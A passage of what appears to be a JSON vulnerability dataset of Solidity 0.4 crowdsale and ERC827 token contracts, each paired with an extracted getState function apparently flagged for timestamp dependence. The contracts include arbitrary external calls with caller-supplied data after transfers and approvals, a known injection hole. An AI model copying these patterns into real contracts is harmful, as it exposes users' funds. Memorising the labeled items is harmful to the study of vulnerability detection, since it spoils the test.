addr, uint128 customerId) public payable {\n if(requiredSignedAddress) throw;\n if(customerId == 0) throw;\n investInternal(addr, customerId);\n }\n function invest(address addr) public payable {\n if(requireCustomerId) throw;\n if(requiredSignedAddress) throw;\n investInternal(addr, 0);\n }\n function buyWithSignedAddress(uint128 customerId, uint8 v, bytes32 r, bytes32 s) public payable {\n investWithSignedAddress(msg.sender, customerId, v, r, s);\n }\n function buyWithCustomerIdWithChecksum(uint128 customerId, bytes1 checksum) public payable {\n if (bytes1(sha3(customerId)) != checksum) throw;\n investWithCustomerId(msg.sender, customerId);\n }\n function buyWithCustomerId(uint128 customerId) public payable {\n investWithCustomerId(msg.sender, customerId);\n }\n function buy() public payable {\n invest(msg.sender);\n }\n function setRequireCustomerId(bool value) onlyOwner {\n requireCustomerId = value;\n InvestmentPolicyChanged(requireCustomerId, requiredSignedAddress, signerAddress);\n }\n function setRequireSignedAddress(bool value, address _signerAddress) onlyOwner {\n requiredSignedAddress = value;\n signerAddress = _signerAddress;\n InvestmentPolicyChanged(requireCustomerId, requiredSignedAddress, signerAddress);\n }\n function () public payable {\n invest(msg.sender);\n }\n}\ncontract MintedTokenCappedCrowdsale is Crowdsale {\n uint public maximumSellableTokens;\n function MintedTokenCappedCrowdsale(address _token, PricingStrategy _pricingStrategy, address _multisigWallet, uint _start, uint _end, uint _minimumFundingGoal, uint _maximumSellableTokens) Crowdsale(_token, _pricingStrategy, _multisigWallet, _start, _end, _minimumFundingGoal) {\n maximumSellableTokens = _maximumSellableTokens;\n }\n function isBreakingCap(uint weiAmount, uint tokenAmount, uint weiRaisedTotal, uint tokensSoldTotal) constant returns (bool limitBroken) {\n return tokensSoldTotal > maximumSellableTokens;\n }\n function isCrowdsaleFull() public constant returns (bool) {\n return tokensSold >= maximumSellableTokens;\n }\n function assignTokens(address receiver, uint tokenAmount) internal {\n MintableToken mintableToken = MintableToken(token);\n mintableToken.mint(receiver, tokenAmount);\n }\n}\ncontract ERC827 is ERC20 {\n function approve( address _spender, uint256 _value, bytes _data ) public returns (bool);\n function transfer( address _to, uint256 _value, bytes _data ) public returns (bool);\n function transferFrom( address _from, address _to, uint256 _value, bytes _data ) public returns (bool);\n}\ncontract ERC827Token is ERC827, StandardToken {\n function approve(address _spender, uint256 _value, bytes _data) public returns (bool) {\n require(_spender != address(this));\n super.approve(_spender, _value);\n require(_spender.call(_data));\n return true;\n }\n function transfer(address _to, uint256 _value, bytes _data) public returns (bool) {\n require(_to != address(this));\n super.transfer(_to, _value);\n require(_to.call(_data));\n return true;\n }\n function transferFrom(address _from, address _to, uint256 _value, bytes _data) public returns (bool) {\n require(_to != address(this));\n super.transferFrom(_from, _to, _value);\n require(_to.call(_data));\n return true;\n }\n function increaseApproval(address _spender, uint _addedValue, bytes _data) public returns (bool) {\n require(_spender != address(this));\n super.increaseApproval(_spender, _addedValue);\n require(_spender.call(_data));\n return true;\n }\n function decreaseApproval(address _spender, uint _subtractedValue, bytes _data) public returns (bool) {\n require(_spender != address(this));\n super.decreaseApproval(_spender, _subtractedValue);\n require(_spender.call(_data));\n return true;\n }\n}\ncontract StandardTokenExt is StandardToken, ERC827Token, Recoverable {\n function isToken() public constant returns (bool weAre) {\n return true;\n }\n}\ncontract MintableToken is StandardTokenExt {\n using SafeMathLib for uint;\n bool public mintingFinished = false;\n mapping (address => bool) public mintAgents;\n event MintingAgentChanged(address addr, bool state);\n event Minted(address receiver, uint amount);\n function mint(address receiver, uint amount) onlyMintAgent canMint public {\n totalSupply_ = totalSupply_.plus(amount);\n balances[receiver] = balances[receiver].plus(amount);\n Transfer(0, receiver, amount);\n }\n function setMintAgent(address addr, bool state) onlyOwner canMint public {\n mintAgents[addr] = state;\n MintingAgentChanged(addr, state);\n }\n modifier onlyMintAgent() {\n if(!mintAgents[msg.sender]) {\n throw;\n }\n _;\n }\n modifier canMint() {\n if(mintingFinished) throw;\n _;\n }\n}",
  "extract_feature": [
    "function getState() public constant returns (State) {\nif(finalized) return State.Finalized;\nelse if (address(finalizeAgent) == 0) return State.Preparing;\nelse if (!finalizeAgent.isSane()) return State.Preparing;\nelse if (!pricingStrategy.isSane(address(this))) return State.Preparing;\nelse if (block.timestamp < startsAt) return State.PreFunding;\nelse if (block.timestamp <= endsAt && !isCrowdsaleFull()) return State.Funding;\nelse if (isMinimumGoalReached()) return State.Success;\nelse if (!isMinimumGoalReached() && weiRaised > 0 && loadedRefund >= weiRaised) return State.Refunding;\nelse return State.Failure;\n}"
  ]
},
{
  "_id": {
    "$oid": "663abaaafa0e1460cdfa1f20"
  },
  "filename": "6747.sol",
  "content": "pragma solidity ^0.4.13;\ncontract FinalizeAgent {\n function isFinalizeAgent() public constant returns(bool) {\n return true;\n }\n function isSane() public constant returns (bool);\n function finalizeCrowdsale();\n}\ncontract PricingStrategy {\n function isPricingStrategy() public constant returns (bool) {\n return true;\n }\n function isSane(address crowdsale) public constant returns (bool) {\n return true;\n }\n function isPresalePurchase(address purchaser) public constant returns (bool) {\n return false;\n }\n function calculatePrice(uint value, uint weiRaised, uint tokensSold, address msgSender, uint decimals) public constant returns (uint tokenAmount);\n}\nlibrary SafeMathLib {\n function times(uint a, uint b) returns (uint) {\n uint c = a * b;\n assert(a == 0 || c / a == b);\n return c;\n }\n function minus(uint a, uint b) returns (uint) {\n assert(b <= a);\n return a - b;\n }\n function plus(uint a, uint b) returns (uint) {\n uint c = a + b;\n assert(c>=a);\n return c;\n }\n}\ncontract Ownable {\n address public owner;\n event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\n function Ownable() public {\n owner = msg.sender;\n }\n modifier onlyOwner() {\n require(msg.sender == owner);\n _;\n }\n function transferOwnership(address newOwner) public onlyOwner {\n require(newOwner != address(0));\n OwnershipTransferred(owner, newOwner);\n owner = newOwner;\n }\n}\ncontract Recoverable is Ownable {\n function Recoverable() {\n }\n function recoverTokens(ERC20Basic token) onlyOwner public {\n token.transfer(owner, tokensToBeReturned(token));\n }\n function tokensToBeReturned(ERC20Basic token) public returns (uint) {\n return token.balanceOf(this);\n }\n}\ncontract Haltable is Ownable {\n bool public halted;\n modifier stopInEmergency {\n if (halted) throw;\n _;\n }\n modifier stopNonOwnersInEmergency {\n if (halted && msg.sender != owner) throw;\n _;\n }\n modifier onlyInEmergency {\n if (!halted) throw;\n _;\n }\n function halt() external onlyOwner {\n halted = true;\n }\n function unhalt() external onlyOwner onlyInEmergency {\n halted = false;\n }\n}\ncontract Whitelist is Ownable {\n mapping(address => bool) public whitelist;\n event WhitelistedAddressAdded(address addr);\n event WhitelistedAddressRemoved(address addr);\n modifier onlyWhitelisted() {\n require(whitelist[msg.sender]);\n _;\n }\n function addAddressToWhitelist(address addr) onlyOwner public returns(bool success) {\n if (!whitelist[addr]) {\n whitelist[addr] = true;\n WhitelistedAddressAdded(addr);\n success = true;\n }\n }\n function addAddressesToWhitelist(address[] addrs) onlyOwner public returns(bool success) {\n for (uint256 i = 0; i < addrs.length; i++) {\n if (addAddressToWhitelist(addrs[i])) {\n success = true;\n }\n }\n }\n function removeAddressFromWhitelist(address addr) onlyOwner public returns(bool success) {\n if (whitelist[addr]) {\n whitelist[addr] = false;\n WhitelistedAddressRemoved(addr);\n success = true;\n }\n }\n function removeAddressesFromWhitelist(address[] addrs) onlyOwner public returns(bool success) {\n for (uint256 i = 0; i < addrs.length; i++) {\n if (removeAddressFromWhitelist(addrs[i])) {\n success = true;\n }\n }\n }\n}\ncontract ERC20Basic {\n function totalSupply() public view returns (uint256);\n function balanceOf(address who) public view returns (uint256);\n function transfer(address to, uint256 value) public returns (bool);\n event Transfer(address indexed from, address indexed to, uint256 value);\n}\ncontract ERC20 is ERC20Basic {\n function allowance(address owner, address spender) public view returns (uint256);\n function transferFrom(address from, address to, uint256 value) public returns (bool);\n function approve(address spender, uint256 value) public returns (bool);\n event Approval(address indexed owner, address indexed spender, uint256 value);\n}\ncontract FractionalERC20 is ERC20 {\n uint public decimals;\n}\nlibrary SafeMath {\n function mul(uint256 a, uint256 b) internal pure returns (uint256) {\n if (a == 0) {\n return 0;\n }\n uint256 c = a * b;\n assert(c / a == b);\n return c;\n }\n function div(uint256 a, uint256 b) internal pure returns (uint256) {\n uint256 c = a / b;\n return c;\n }\n function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n assert(b <= a);\n return a - b;\n }\n function add(uint256 a, uint256 b) internal pure returns (uint256) {\n uint256 c = a + b;\n assert(c >= a);\n return c;\n }\n}\ncontract BasicToken is ERC20Basic {\n using SafeMath for uint256;\n mapping(address => uint256) balances;\n uint256 totalSupply_;\n function totalSupply() public view returns (uint256) {\n return totalSupply_;\n }\n function transfer(address _to, uint256 _value) public returns (bool) {\n require(_to != address(0));\n require(_value <= balances[msg.sender]);\n balances[msg.sender] = balances[msg.sender].sub(_value);\n balances[_to] = balances[_to].add(_value);\n Transfer(msg.sender, _to, _value);\n return true;\n }\n function balanceOf(address _owner) public view returns (uint256 balance) {\n return balances[_owner];\n }\n}\ncontract StandardToken is ERC20, BasicToken {\n mapping (address => mapping (address => uint256)) internal allowed;\n function transferFrom(address _from, address _to, uint256 _value) public returns (bool) {\n require(_to != address(0));\n require(_value <= balances[_from]);\n require(_value <= allowed[_from][msg.sender]);\n balances[_from] = balances[_from].sub(_value);\n balances[_to] = balances[_to].add(_value);\n allowed[_from][msg.sender] = allowed[_from][msg.sender].sub(_value);\n Transfer(_from, _to, _value);\n return true;\n }\n function approve(address _spender, uint256 _value) public returns (bool) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) public view returns (uint256) {\n return allowed[_owner][_spender];\n }\n function increaseApproval(address _spender, uint _addedValue) public returns (bool) {\n allowed[msg.sender][_spender] = allowed[msg.sender][_spender].add(_addedValue);\n Approval(msg.sender, _spender, allowed[msg.sender][_spender]);\n return true;\n }\n function decreaseApproval(address _spender, uint _subtractedValue) public returns (bool) {\n uint oldValue = allowed[msg.sender][_spender];\n if (_subtractedValue > oldValue) {\n allowed[msg.sender][_spender] = 0;\n } else {\n allowed[msg.sender][_spender] = oldValue.sub(_subtractedValue);\n }\n Approval(msg.sender, _spender, allowed[msg.sender][_spender]);\n return true;\n }\n}\ncontract CrowdsaleBase is Haltable, Whitelist {\n uint public MAX_INVESTMENTS_BEFORE_MULTISIG_CHANGE = 5;\n using SafeMathLib for uint;\n FractionalERC20 public token;\n PricingStrategy public pricingStrategy;\n FinalizeAgent public finalizeAgent;\n address public multisigWallet;\n uint public minimumFundingGoal;\n uint public startsAt;\n uint public endsAt;\n uint public tokensSold = 0;\n uint public weiRaised = 0;\n uint public presaleWeiRaised = 0;\n uint public investorCount = 0;\n uint public loadedRefund = 0;\n uint public weiRefunded = 0;\n bool public finalized;\n mapping (address => uint256) public investedAmountOf;\n mapping (address => uint256) public tokenAmountOf;\n mapping (address => bool) public earlyParticipantWhitelist;\n uint public ownerTestValue;\n enum State{Unknown, Preparing, PreFunding, Funding, Success, Failure, Finalized, Refunding}\n event Invested(address investor, uint weiAmount, uint tokenAmount, uint128 customerId);\n event Refund(address investor, uint weiAmount);\n event InvestmentPolicyChanged(bool newRequireCustomerId, bool newRequiredSignedAddress, address newSignerAddress);\n event Whitelisted(address addr, bool status);\n event EndsAtChanged(uint newEndsAt);\n function CrowdsaleBase(address _token, PricingStrategy _pricingStrategy, address _multisigWallet, uint _start, uint _end, uint _minimumFundingGoal) {\n owner = msg.sender;\n token = FractionalERC20(_token);\n setPricingStrategy(_pricingStrategy);\n multisigWallet = _multisigWallet;\n if(multisigWallet == 0) {\n throw;\n }\n if(_start == 0) {\n throw;\n }\n startsAt = _start;\n if(_end == 0) {\n throw;\n }\n endsAt = _end;\n if(startsAt >= endsAt) {\n throw;\n }\n minimumFundingGoal = _minimumFundingGoal;\n }\n function investInternal(address receiver, uint128 customerId) stopInEmergency internal returns(uint tokensBought) {\n Whitelist dc;\n address contract_addr = 0x062e41d1037745dc203e8c1AAcA651B8d157Da96;\n dc = Whitelist(contract_addr);\n require (dc.whitelist(msg.sender));\n require (dc.whitelist(receiver));\n if(getState() == State.PreFunding) {\n if(!earlyParticipantWhitelist[receiver]) {\n throw;\n }\n } else if(getState() == State.Funding) {\n } else {\n throw;\n }\n uint weiAmount = msg.value;\n require(weiAmount >= minimumFundingGoal);\n uint tokenAmount = pricingStrategy.calculatePrice(weiAmount, weiRaised - presaleWeiRaised, tokensSold, msg.sender, token.decimals());\n require(tokenAmount != 0);\n if(investedAmountOf[receiver] == 0) {\n investorCount++;\n }\n investedAmountOf[receiver] = investedAmountOf[receiver].plus(weiAmount);\n tokenAmountOf[receiver] = tokenAmountOf[receiver].plus(tokenAmount);\n weiRaised = weiRaised.plus(weiAmount);\n tokensSold = tokensSold.plus(tokenAmount);\n if(pricingStrategy.isPresalePurchase(receiver)) {\n presaleWeiRaised = presaleWeiRaised.plus(weiAmount);\n }\n require(!isBreakingCap(weiAmount, tokenAmount, weiRaised, tokensSold));\n assignTokens(receiver, tokenAmount);\n if(!multisigWallet.send(weiAmount)) throw;\n Invested(receiver, weiAmount, tokenAmount, customerId);\n return tokenAmount;\n }\n function finalize() public inState(State.Success) onlyOwner stopInEmergency {\n if(finalized) {\n throw;\n }\n if(address(finalizeAgent) != 0) {\n finalizeAgent.finalizeCrowdsale();\n }\n finalized = true;\n }\n function setFinalizeAgent(FinalizeAgent addr) onlyOwner {\n finalizeAgent = addr;\n if(!finalizeAgent.isFinalizeAgent()) {\n throw;\n }\n }\n function setEndsAt(uint time) onlyOwner {\n if(now > time) {\n throw;\n }\n if(startsAt > time) {\n throw;\n }\n endsAt = time;\n EndsAtChanged(endsAt);\n }\n function setPricingStrategy(PricingStrategy _pricingStrategy) onlyOwner {\n pricingStrategy = _pricingStrategy;\n if(!pricingStrategy.isPricingStrategy()) {\n throw;\n }\n }\n function setMultisig(address addr) public onlyOwner {\n if(investorCount > MAX_INVESTMENTS_BEFORE_MULTISIG_CHANGE) {\n throw;\n }\n multisigWallet = addr;\n }\n function loadRefund() public payable inState(State.Failure) {\n if(msg.value == 0) throw;\n loadedRefund = loadedRefund.plus(msg.value);\n }\n function refund() public inState(State.Refunding) {\n uint256 weiValue = investedAmountOf[msg.sender];\n if (weiValue == 0) throw;\n investedAmountOf[msg.sender] = 0;\n weiRefunded = weiRefunded.plus(weiValue);\n Refund(msg.sender, weiValue);\n if (!msg.sender.send(weiValue)) throw;\n }\n function isMinimumGoalReached() public constant returns (bool reached) {\n return weiRaised >= minimumFundingGoal;\n }\n function isFinalizerSane() public constant returns (bool sane) {\n return finalizeAgent.isSane();\n }\n function isPricingSane() public constant returns (bool sane) {\n return pricingStrategy.isSane(address(this));\n }\n function getState() public constant returns (State) {\n if(finalized) return State.Finalized;\n else if (address(finalizeAgent) == 0) return State.Preparing;\n else if (!finalizeAgent.isSane()) return State.Preparing;\n else if (!pricingStrategy.isSane(address(this))) return State.Preparing;\n else if (block.timestamp < startsAt) return State.PreFunding;\n else if (block.timestamp <= endsAt && !isCrowdsaleFull()) return State.Funding;\n else if (isMinimumGoalReached()) return State.Success;\n else if (!isMinimumGoalReached() && weiRaised > 0 && loadedRefund >= weiRaised) return State.Refunding;\n else return State.Failure;\n }\n function setOwnerTestValue(uint val) onlyOwner {\n ownerTestValue = val;\n }\n function setEarlyParicipantWhitelist(address addr, bool status) onlyOwner {\n earlyParticipantWhitelist[addr] = status;\n Whitelisted(addr, status);\n }\n function isCrowdsale() public constant returns (bool) {\n return true;\n }\n modifier inState(State state) {\n if(getState() != state) throw;\n _;\n }\n function isBreakingCap(uint weiAmount, uint tokenAmount, uint weiRaisedTotal, uint tokensSoldTotal) constant returns (bool limitBroken);\n function isCrowdsaleFull() public constant returns (bool);\n function assignTokens(address receiver, uint tokenAmount) internal;\n}\ncontract Crowdsale is CrowdsaleBase {\n bool public requireCustomerId;\n bool public requiredSignedAddress;\n address public signerAddress;\n function Crowdsale(address _token, PricingStrategy _pricingStrategy, address _multisigWallet, uint _start, uint _end, uint _minimumFundingGoal) CrowdsaleBase(_token, _pricingStrategy, _multisigWallet, _start, _end, _minimumFundingGoal) {\n }\n function preallocate(address receiver, uint fullTokens, uint weiPrice) public onlyOwner {\n uint tokenAmount = fullTokens * 10**token.decimals();\n uint weiAmount = weiPrice * fullTokens;\n weiRaised = weiRaised.plus(weiAmount);\n tokensSold = tokensSold.plus(tokenAmount);\n investedAmountOf[receiver] = investedAmountOf[receiver].plus(weiAmount);\n tokenAmountOf[receiver] = tokenAmountOf[receiver].plus(tokenAmount);\n assignTokens(receiver, tokenAmount);\n Invested(receiver, weiAmount, tokenAmount, 0);\n }\n function investWithSignedAddress(address addr, uint128 customerId, uint8 v, bytes32 r, bytes32 s) public payable {\n bytes32 hash = sha256(addr);\n if (ecrecover(hash, v, r, s) != signerAddress) throw;\n if(customerId == 0) throw;\n investInternal(addr, customerId);\n }\n function investWithCustomerId(address addr, uint128 customerId) public payable {\n if(requiredSignedAddress) throw;\n if(customerId == 0) throw;\n investInternal(addr, customerId);\n }\n function invest(address addr) public payable {\n if(requireCustomerId) throw;\n if(requiredSignedAddress) throw;\n investInternal(addr, 0);\n }\n function buyWithSignedAddress(uint128 customerId, uint8 v, bytes32 r, bytes32 s) public payable {\n investWithSignedAddress(msg.sender, customerId, v, r, s);\n }\n function buyWithCustomerIdWithChecksum(uint128 customerId, bytes1 checksum) public payable {\n if (bytes1(sha3(customerId)) != checksum) throw;\n investWithCustomerId(msg.sender, customerId);\n }\n function buyWithCustomerId(uint128 customerId) public payable {\n investWithCustomerId(msg.sender, customerId);\n }\n function buy() public payable {\n invest(msg.sender);\n }\n function setRequireCustomerId(bool value) onlyOwner {\n requireCustomerId = value;\n InvestmentPolicyChanged(requireCustomerId, requiredSignedAddress, signerAddress);\n }\n function setRequireSignedAddress(bool value, address _signerAddress) onlyOwner {\n requiredSignedAddress = value;\n signerAddress = _signerAddress;\n InvestmentPolicyChanged(requireCustomerId, requiredSignedAddress, signerAddress);\n }\n function () public payable {\n invest(msg.sender);\n }\n}\ncontract MintedTokenCappedCrowdsale is Crowdsale {\n uint public maximumSellableTokens;\n function MintedTokenCappedCrowdsale(address _token, PricingStrategy _pricingStrategy, address _multisigWallet, uint _start, uint _end, uint _minimumFundingGoal, uint _maximumSellableTokens) Crowdsale(_token, _pricingStrategy, _multisigWallet, _start, _end, _minimumFundingGoal) {\n maximumSellableTokens = _maximumSellableTokens;\n }\n function isBreakingCap(uint weiAmount, uint tokenAmount, uint weiRaisedTotal, uint tokensSoldTotal) constant returns (bool limitBroken) {\n return tokensSoldTotal > maximumSellableTokens;\n }\n function isCrowdsaleFull() public constant returns (bool) {\n return tokensSold >= maximumSellableTokens;\n }\n function assignTokens(address receiver, uint tokenAmount) internal {\n MintableToken mintableToken = MintableToken(token);\n mintableToken.mint(receiver, tokenAmount);\n }\n}\ncontract ERC827 is ERC20 {\n function approve( address _spender, uint256 _value, bytes _data ) public returns (bool);\n function transfer( address _to, uint256 _value, bytes _data ) public returns (bool);\n function transferFrom( address _from, address _to, uint256 _value, bytes _data ) public returns (bool);\n}\ncontract ERC827Token is ERC827, StandardToken {\n function approve(address _spender, uint256 _value, bytes _data) public returns (bool) {\n require(_spender != address(this));\n super.approve(_spender, _value);\n require(_spender.call(_data));\n return true;\n }\n function transfer(address _to, uint256 _value, bytes _data) public returns (bool) {\n require(_to != address(this));\n super.transfer(_to, _value);\n require(_to.call(_data));\n return true;\n }\n function transferFrom(address _from, address _to, uint256 _value, bytes _data) public returns (bool) {\n require(_to != address(this));\n super.transferFrom(_from, _to, _value);\n require(_to.call(_data));\n return true;\n }\n function increaseApproval(address _spender, uint _addedValue, bytes _data) public returns (bool) {\n require(_spender != address(this));\n super.increaseApproval(_spender, _addedValue);\n require(_spender.call(_data));\n return true;\n }\n function decreaseApproval(address _spender, uint _subtractedValue, bytes _data) public returns (bool) {\n require(_spender != address(this));\n super.decreaseApproval(_spender, _subtractedValue);\n require(_spender.call(_data));\n return true;\n }\n}\ncontract StandardTokenExt is StandardToken, ERC827Token, Recoverable {\n function isToken() public constant returns (bool weAre) {\n return true;\n }\n}\ncontract MintableToken is StandardTokenExt {\n using SafeMathLib for uint;\n bool public mintingFinished = false;\n mapping (address => bool) public mintAgents;\n event MintingAgentChanged(address addr, bool state);\n event Minted(address receiver, uint amount);\n function mint(address receiver, uint amount) onlyMintAgent canMint public {\n totalSupply_ = totalSupply_.plus(amount);\n balances[receiver] = balances[receiver].plus(amount);\n Transfer(0, receiver, amount);\n }\n function setMintAgent(address addr, bool state) onlyOwner canMint public {\n mintAgents[addr] = state;\n MintingAgentChanged(addr, state);\n }\n modifier onlyMintAgent() {\n if(!mintAgents[msg.sender]) {\n throw;\n }\n _;\n }\n modifier canMint() {\n if(mintingFinished) throw;\n _;\n }\n}",
  "extract_feature": [
    "function getState() public constant returns (State) {\nif(finalized) return State.Finalized;\nelse if (address(finalizeAgent) == 0) return State.Preparing;\nelse if (!finalizeAgent.isSane()) return State.Preparing;\nelse if (!pricingStrategy.isSane(address(this))) return State.Preparing;\nelse if (block.timestamp < startsAt) return State.PreFunding;\nelse if (block.timestamp <= endsAt && !isCrowdsaleFull()) return State.Funding;\nelse if (isMinimumGoalReached()) return State.Success;\nelse if (!isMinimumGoalReached() && weiRaised > 0 && loadedRefund >= weiRaised) return State.Refunding;\nelse return State.Failure;\n}"
  ]
},
{
  "_id": {
    "$oid": "663abaaafa0e1460cdfa1f21"
  },
  "filename": "6753.sol",
  "content": "pragma solidity ^0.4.13;\ncontract FinalizeAgent {\n function isFinalizeAgent() public constant returns(bool) {\n return true;\n }\n function isSane() public constant returns (bool);\n function finalizeCrowdsale();\n}\ncontract PricingStrategy {\n function isPricingStrategy() public constant returns (bool) {\n return true;\n }\n function isSane(address crowdsale) public constant returns (bool) {\n return true;\n }\n function isPresalePurchase(address purchaser) public constant returns (bool) {\n return false;\n }\n function calculatePrice(uint value, uint weiRaised, uint tokensSold, address msgSender, uint decimals) public constant returns (uint tokenAmount);\n}\nlibrary SafeMathLib {\n function times(uint a, uint b) returns (uint) {\n uint c = a * b;\n assert(a == 0 || c / a == b);\n return c;\n }\n function minus(uint a, uint b) returns (uint) {\n assert(b <= a);\n return a - b;\n }\n function plus(uint a, uint b) returns (uint) {\n uint c = a + b;\n assert(c>=a);\n return c;\n }\n}\ncontract Ownable {\n address public owner;\n event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\n function Ownable() public {\n owner = msg.sender;\n }\n modifier onlyOwner() {\n require(msg.sender == owner);\n _;\n }\n function transferOwnership(address newOwner) public onlyOwner {\n require(newOwner != address(0));\n OwnershipTransferred(owner, newOwner);\n owner = newOwner;\n }\n}\ncontract Recoverable is Ownable {\n function Recoverable() {\n }\n function recoverTokens(ERC20Basic token) onlyOwner public {\n token.transfer(owner, tokensToBeReturned(token));\n }\n function tokensToBeReturned(ERC20Basic token) public returns (uint) {\n return token.balanceOf(this);\n }\n}\ncontract Haltable is Ownable {\n bool public halted;\n modifier stopInEmergency {\n if (halted) throw;\n _;\n }\n modifier stopNonOwnersInEmergency {\n if (halted && msg.sender != owner) throw;\n _;\n }\n modifier onlyInEmergency {\n if (!halted) throw;\n _;\n }\n function halt() external onlyOwner {\n halted = true;\n }\n function unhalt() external onlyOwner onlyInEmergency {\n halted = false;\n }\n}\ncontract Whitelist is Ownable {\n mapping(address => bool) public whitelist;\n event WhitelistedAddressAdded(address addr);\n event WhitelistedAddressRemoved(address addr);\n modifier onlyWhitelisted() {\n require(whitelist[msg.sender]);\n _;\n }\n function addAddressToWhitelist(address addr) onlyOwner public returns(bool success) {\n if (!whitelist[addr]) {\n whitelist[addr] = true;\n WhitelistedAddressAdded(addr);\n success = true;\n }\n }\n function addAddressesToWhitelist(address[] addrs) onlyOwner public returns(bool success) {\n for (uint256 i = 0; i < addrs.length; i++) {\n if (addAddressToWhitelist(addrs[i])) {\n success = true;\n }\n }\n }\n function removeAddressFromWhitelist(address addr) onlyOwner public returns(bool success) {\n if (whitelist[addr]) {\n whitelist[addr] = false;\n WhitelistedAddressRemoved(addr);\n success = true;\n }\n }\n function removeAddressesFromWhitelist(address[] addrs) onlyOwner public returns(bool success) {\n for (uint256 i = 0; i < addrs.length; i++) {\n if (removeAddressFromWhitelist(addrs[i])) {\n success = true;\n }\n }\n }\n}\ncontract ERC20Basic {\n function totalSupply() public view returns (uint256);\n function balanceOf(address who) public view returns (uint256);\n function transfer(address to, uint256 value) public returns (bool);\n event Transfer(address indexed from, address indexed to, uint256 value);\n}\ncontract ERC20 is ERC20Basic {\n function allowance(address owner, address spender) public view returns (uint256);\n function transferFrom(address from, address to, uint256 value) public returns (bool);\n function approve(address spender, uint256 value) public returns (bool);\n event Approval(address indexed owner, address indexed spender, uint256 value);\n}\ncontract FractionalERC20 is ERC20 {\n uint public decimals;\n}\nlibrary SafeMath {\n function mul(uint256 a, uint256 b) internal pure returns (uint256) {\n if (a == 0) {\n return 0;\n }\n uint256 c = a * b;\n assert(c / a == b);\n return c;\n }\n function div(uint256 a, uint256 b) internal pure returns (uint256) {\n uint256 c = a / b;\n return c;\n }\n function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n assert(b <= a);\n return a - b;\n }\n function add(uint256 a, uint256 b) internal pure returns (uint256) {\n uint256 c = a + b;\n assert(c >= a);\n return c;\n }\n}\ncontract BasicToken is ERC20Basic {\n using SafeMath for uint256;\n mapping(address => uint256) balances;\n uint256 totalSupply_;\n function totalSupply() public view returns (uint256) {\n return totalSupply_;\n }\n function transfer(address _to, uint256 _value) public returns (bool) {\n require(_to != address(0));\n require(_value <= balances[msg.sender]);\n balances[msg.sender] = balances[msg.sender].sub(_value);\n balances[_to] = balances[_to].add(_value);\n Transfer(msg.sender, _to, _value);\n return true;\n }\n function balanceOf(address _owner) public view returns (uint256 balance) {\n return balances[_owner];\n }\n}\ncontract StandardToken is ERC20, BasicToken {\n mapping (address => mapping (address => uint256)) internal allowed;\n function transferFrom(address _from, address _to, uint256 _value) public returns (bool) {\n require(_to != address(0));\n require(_value <= balances[_from]);\n require(_value <= allowed[_from][msg.sender]);\n balances[_from] = balances[_from].sub(_value);\n balances[_to] = balances[_to].add(_value);\n allowed[_from][msg.sender] = allowed[_from][msg.sender].sub(_value);\n Transfer(_from, _to, _value);\n return true;\n }\n function approve(address _spender, uint256 _value) public returns (bool) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) public view returns (uint256) {\n return allowed[_owner][_spender];\n }\n function increaseApproval(address _spender, uint _addedValue) public returns (bool) {\n allowed[msg.sender][_spender] = allowed[msg.sender][_spender].add(_addedValue);\n Approval(msg.sender, _spender, allowed[msg.sender][_spender]);\n return true;\n }\n function decreaseApproval(address _spender, uint _subtractedValue) public returns (bool) {\n uint oldValue = allowed[msg.sender][_spender];\n if (_subtractedValue > oldValue) {\n allowed[msg.sender][_spender] = 0;\n } else {\n allowed[msg.sender][_spender] = oldValue.sub(_subtractedValue);\n }\n Approval(msg.sender, _spender, allowed[msg.sender][_spender]);\n return true;\n }\n}\ncontract CrowdsaleBase is Haltable, Whitelist {\n uint public MAX_INVESTMENTS_BEFORE_MULTISIG_CHANGE = 5;\n using SafeMathLib for uint;\n FractionalERC20 public token;\n PricingStrategy public pricingStrategy;\n FinalizeAgent public finalizeAgent;\n address public multisigWallet;\n uint public minimumFundingGoal;\n uint public startsAt;\n uint public endsAt;\n uint public tokensSold = 0;\n uint public weiRaised = 0;\n uint public presaleWeiRaised = 0;\n uint public investorCount = 0;\n uint public loadedRefund = 0;\n uint public weiRefunded = 0;\n bool public finalized;\n mapping (address => uint256) public investedAmountOf;\n mapping (address => uint256) public tokenAmountOf;\n mapping (address => bool) public earlyParticipantWhitelist;\n uint public ownerTestValue;\n enum State{Unknown, Preparing, PreFunding, Funding, Success, Failure, Finalized, Refunding}\n event Invested(address investor, uint weiAmount, uint tokenAmount, uint128 customerId);\n event Refund(address investor, uint weiAmount);\n event InvestmentPolicyChanged(bool newRequireCustomerId, bool newRequiredSignedAddress, address newSignerAddress);\n event Whitelisted(address addr, bool status);\n event EndsAtChanged(uint newEndsAt);\n function CrowdsaleBase(address _token, PricingStrategy _pricingStrategy, address _multisigWallet, uint _start, uint _end, uint _minimumFundingGoal) {\n owner = msg.sender;\n token = FractionalERC20(_token);\n setPricingStrategy(_pricingStrategy);\n multisigWallet = _multisigWallet;\n if(multisigWallet == 0) {\n throw;\n }\n if(_start == 0) {\n throw;\n }\n startsAt = _start;\n if(_end == 0) {\n throw;\n }\n endsAt = _end;\n if(startsAt >= endsAt) {\n throw;\n }\n minimumFundingGoal = _minimumFundingGoal;\n }\n function investInternal(address receiver, uint128 customerId) stopInEmergency internal returns(uint tokensBought) {\n Whitelist dc;\n address contract_addr = 0x062e41d1037745dc203e8c1AAcA651B8d157Da96;\n dc = Whitelist(contract_addr);\n require (dc.whitelist(msg.sender));\n require (dc.whitelist(receiver));\n if(getState() == State.PreFunding) {\n if(!earlyParticipantWhitelist[receiver]) {\n throw;\n }\n } else if(getState() == State.Funding) {\n } else {\n throw;\n }\n uint weiAmount = msg.value;\n require(weiAmount >= minimumFundingGoal);\n uint tokenAmount = pricingStrategy.calculatePrice(weiAmount, weiRaised - presaleWeiRaised, tokensSold, msg.sender, token.decimals());\n require(tokenAmount != 0);\n if(investedAmountOf[receiver] == 0) {\n investorCount++;\n }\n investedAmountOf[receiver] = investedAmountOf[receiver].plus(weiAmount);\n tokenAmountOf[receiver] = tokenAmountOf[receiver].plus(tokenAmount);\n weiRaised = weiRaised.plus(weiAmount);\n tokensSold = 